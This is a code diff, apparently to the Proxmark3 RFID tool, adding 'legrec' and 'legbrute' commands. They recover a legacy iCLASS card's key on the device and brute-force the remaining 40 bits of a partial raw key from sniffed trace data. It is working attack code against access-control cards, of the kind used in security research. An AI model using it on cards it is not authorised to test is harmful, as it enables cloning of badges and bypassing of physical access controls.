@@ -3842,6 +3842,284 @@ void picopass_elite_nextKey(uint8_t* key) {
     memcpy(key, key_state, 8);
 }
 
+static int CmdHFiClassRecover(uint8_t key[8]) {
+
+    uint32_t payload_size = sizeof(iclass_recover_req_t);
+    uint8_t aa2_standard_key[PICOPASS_BLOCK_SIZE] = {0};
+    memcpy(aa2_standard_key, iClass_Key_Table[1], PICOPASS_BLOCK_SIZE);
+    iclass_recover_req_t *payload = calloc(1, payload_size);
+    payload->req.use_raw = true;
+    payload->req.use_elite = false;
+    payload->req.use_credit_key = false;
+    payload->req.use_replay = true;
+    payload->req.send_reply = true;
+    payload->req.do_auth = true;
+    payload->req.shallow_mod = false;
+    payload->req2.use_raw = false;
+    payload->req2.use_elite = false;
+    payload->req2.use_credit_key = true;
+    payload->req2.use_replay = false;
+    payload->req2.send_reply = true;
+    payload->req2.do_auth = true;
+    payload->req2.shallow_mod = false;
+    memcpy(payload->req.key, key, 8);
+    memcpy(payload->req2.key, aa2_standard_key, 8);
+
+    PrintAndLogEx(INFO, "Recover started...");
+
+    PacketResponseNG resp;
+    clearCommandBuffer();
+    SendCommandNG(CMD_HF_ICLASS_RECOVER, (uint8_t *)payload, payload_size);
+
+    WaitForResponse(CMD_HF_ICLASS_RECOVER, &resp);
+
+    if (resp.status == PM3_SUCCESS) {
+        PrintAndLogEx(SUCCESS, "iCLASS Recover " _GREEN_("successful"));
+    } else {
+        PrintAndLogEx(WARNING, "iCLASS Recover " _RED_("failed"));
+    }
+
+    free(payload);
+    return resp.status;
+}
+
+typedef struct {
+    uint32_t start_index;
+    uint32_t keycount;
+    const uint8_t *startingKey;
+    uint8_t (*keyBlock)[PICOPASS_BLOCK_SIZE];
+} ThreadData;
+
+void *generate_key_blocks(void *arg) {
+    ThreadData *data = (ThreadData *)arg;
+    uint32_t start_index = data->start_index;
+    uint32_t keycount = data->keycount;
+    const uint8_t *startingKey = data->startingKey;
+    uint8_t (*keyBlock)[PICOPASS_BLOCK_SIZE] = data->keyBlock;
+
+    for (uint32_t i = 0; i < keycount; i++) {
+        uint32_t carry = start_index + i;
+        memcpy(keyBlock[i], startingKey, PICOPASS_BLOCK_SIZE);
+
+        for (int j = PICOPASS_BLOCK_SIZE - 1; j >= 0; j--) {
+            uint8_t increment_value = (carry & 0x1F) << 3;  // Use only the first 5 bits of carry
+            keyBlock[i][j] = (keyBlock[i][j] & 0x07) | increment_value;  // Preserve the last three bits
+
+            carry >>= 5;  // Shift right by 5 bits for the next byte
+            if (carry == 0) {
+                // If no more carry, break early to avoid unnecessary loops
+                break;
+            }
+        }
+    }
+
+    return NULL;
+}
+
+static int CmdHFiClassLegRecLookUp(const char *Cmd) {
+
+    //Standalone Command Start
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf iclass legbrute",
+                  "This command take sniffed trace data and partial raw key and bruteforces the remaining 40 bits of the raw key.",
+                  "hf iclass legbrute --csn 8D7BD711FEFF12E0 --epurse feffffffffffffff --macs 00000000BD478F76 --pk B4F12AADC5301225"
+                 );
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_str1(NULL, "csn", "<hex>", "Specify CSN as 8 hex bytes"),
+        arg_str1(NULL, "epurse", "<hex>", "Specify ePurse as 8 hex bytes"),
+        arg_str1(NULL, "macs", "<hex>", "MACs"),
+        arg_str1(NULL, "pk", "<hex>", "Partial Key"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    int csn_len = 0;
+    uint8_t csn[8] = {0};
+    CLIGetHexWithReturn(ctx, 1, csn, &csn_len);
+
+    if (csn_len > 0) {
+        if (csn_len != 8) {
+            PrintAndLogEx(ERR, "CSN is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int epurse_len = 0;
+    uint8_t epurse[8] = {0};
+    CLIGetHexWithReturn(ctx, 2, epurse, &epurse_len);
+
+    if (epurse_len > 0) {
+        if (epurse_len != 8) {
+            PrintAndLogEx(ERR, "ePurse is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int macs_len = 0;
+    uint8_t macs[8] = {0};
+    CLIGetHexWithReturn(ctx, 3, macs, &macs_len);
+
+    if (macs_len > 0) {
+        if (macs_len != 8) {
+            PrintAndLogEx(ERR, "MAC is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int startingkey_len = 0;
+    uint8_t startingKey[8] = {0};
+    CLIGetHexWithReturn(ctx, 4, startingKey, &startingkey_len);
+
+    if (startingkey_len > 0) {
+        if (startingkey_len != 8) {
+            PrintAndLogEx(ERR, "Partial Key is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    CLIParserFree(ctx);
+    //Standalone Command End
+
+    uint8_t CCNR[12];
+    uint8_t MAC_TAG[4] = {0, 0, 0, 0};
+
+    // Copy CCNR and MAC_TAG
+    memcpy(CCNR, epurse, 8);
+    memcpy(CCNR + 8, macs, 4);
+    memcpy(MAC_TAG, macs + 4, 4);
+
+    PrintAndLogEx(SUCCESS, "    CSN: " _GREEN_("%s"), sprint_hex(csn, 8));
+    PrintAndLogEx(SUCCESS, " Epurse: %s", sprint_hex(epurse, 8));
+    PrintAndLogEx(SUCCESS, "   MACS: %s", sprint_hex(macs, 8));
+    PrintAndLogEx(SUCCESS, "   CCNR: " _GREEN_("%s"), sprint_hex(CCNR, sizeof(CCNR)));
+    PrintAndLogEx(SUCCESS, "TAG MAC: %s", sprint_hex(MAC_TAG, sizeof(MAC_TAG)));
+    PrintAndLogEx(SUCCESS, "Starting Key: %s", sprint_hex(startingKey, 8));
+
+    uint32_t keycount = 1000000;
+    uint32_t keys_per_thread = 200000;
+    uint32_t num_threads = keycount / keys_per_thread;
+    pthread_t threads[num_threads];
+    ThreadData thread_data[num_threads];
+    iclass_prekey_t *prekey = NULL;
+    iclass_prekey_t lookup;
+    iclass_prekey_t *item = NULL;
+
+    memcpy(lookup.mac, MAC_TAG, 4);
+
+    uint32_t block_index = 0;
+
+    while (item == NULL) {
+        for (uint32_t t = 0; t < num_threads; t++) {
+            thread_data[t].start_index = block_index * keycount + t * keys_per_thread;
+            thread_data[t].keycount = keys_per_thread;
+            thread_data[t].startingKey = startingKey;
+            thread_data[t].keyBlock = calloc(keys_per_thread, PICOPASS_BLOCK_SIZE);
+
+            if (thread_data[t].keyBlock == NULL) {
+                PrintAndLogEx(ERR, "Memory allocation failed for keyBlock in thread %d.", t);
+                for (uint32_t i = 0; i < t; i++) {
+                    free(thread_data[i].keyBlock);
+                }
+                return PM3_EINVARG;
+            }
+
+            pthread_create(&threads[t], NULL, generate_key_blocks, (void *)&thread_data[t]);
+        }
+
+        for (uint32_t t = 0; t < num_threads; t++) {
+            pthread_join(threads[t], NULL);
+        }
+
+        if (prekey == NULL) {
+            prekey = calloc(keycount, sizeof(iclass_prekey_t));
+        } else {
+            prekey = realloc(prekey, (block_index + 1) * keycount * sizeof(iclass_prekey_t));
+        }
+
+        if (prekey == NULL) {
+            PrintAndLogEx(ERR, "Memory allocation failed for prekey.");
+            for (uint32_t t = 0; t < num_threads; t++) {
+                free(thread_data[t].keyBlock);
+            }
+            return PM3_EINVARG;
+        }
+
+        PrintAndLogEx(INFO, "Generating diversified keys...");
+        for (uint32_t t = 0; t < num_threads; t++) {
+            GenerateMacKeyFrom(csn, CCNR, true, false, (uint8_t *)thread_data[t].keyBlock, keys_per_thread, prekey + (block_index * keycount) + (t * keys_per_thread));
+        }
+
+        PrintAndLogEx(INFO, "Sorting...");
+
+        // Sort mac list
+        qsort(prekey, (block_index + 1) * keycount, sizeof(iclass_prekey_t), cmp_uint32);
+
+        PrintAndLogEx(SUCCESS, "Searching for " _YELLOW_("%s") " key...", "DEBIT");
+
+        // Binary search
+        item = (iclass_prekey_t *)bsearch(&lookup, prekey, (block_index + 1) * keycount, sizeof(iclass_prekey_t), cmp_uint32);
+
+        for (uint32_t t = 0; t < num_threads; t++) {
+            free(thread_data[t].keyBlock);
+        }
+
+        block_index++;
+    }
+
+    if (item != NULL) {
+        PrintAndLogEx(SUCCESS, "Found valid RAW key " _GREEN_("%s"), sprint_hex(item->key, 8));
+    }
+
+    free(prekey);
+    PrintAndLogEx(NORMAL, "");
+    return PM3_SUCCESS;
+}
+
+
+static int CmdHFiClassLegacyRecover(const char *Cmd) {
+
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf iclass legrec",
+        "Attempts to recover the diversified key of a specific iClass card. This may take a long time. The Card must remain be on the PM3 antenna during the whole process! This process may brick the card!",
+        "hf iclass legrec --macs 0000000089cb984b"
+        );
+
+    void *argtable[] = {
+    arg_param_begin,
+    arg_str1(NULL, "macs", "<hex>", "MACs"),
+    arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    int macs_len = 0;
+    uint8_t macs[8] = {0};
+    CLIGetHexWithReturn(ctx, 1, macs, &macs_len);
+
+    if (macs_len > 0) {
+        if (macs_len != 8) {
+            PrintAndLogEx(ERR, "MAC is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    CLIParserFree(ctx);
+
+    CmdHFiClassRecover(macs);
+
+    PrintAndLogEx(WARNING, _YELLOW_("If the process completed, you can now run 'hf iclass legrecbrute' with the partial key found."));
+
+    PrintAndLogEx(NORMAL, "");
+    return PM3_SUCCESS;
+
+}
+
 static int CmdHFiClassLookUp(const char *Cmd) {
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf iclass lookup",
@@ -4738,6 +5016,8 @@ static command_t CommandTable[] = {
     {"chk",         CmdHFiClassCheckKeys,       IfPm3Iclass,     "Check keys"},
     {"loclass",     CmdHFiClass_loclass,        AlwaysAvailable, "Use loclass to perform bruteforce reader attack"},
     {"lookup",      CmdHFiClassLookUp,          AlwaysAvailable, "Uses authentication trace to check for key in dictionary file"},
+    {"legrec",      CmdHFiClassLegacyRecover,   IfPm3Iclass,     "Attempts to recover the standard key of a legacy card"},
+    {"legbrute",    CmdHFiClassLegRecLookUp,    AlwaysAvailable, "Bruteforces 40 bits of a partial raw key"},
     {"-----------", CmdHelp,                    IfPm3Iclass,     "-------------------- " _CYAN_("Simulation") " -------------------"},
     {"sim",         CmdHFiClassSim,             IfPm3Iclass,     "Simulate iCLASS tag"},
     {"eload",       CmdHFiClassELoad,           IfPm3Iclass,     "Upload file into emulator memory"},
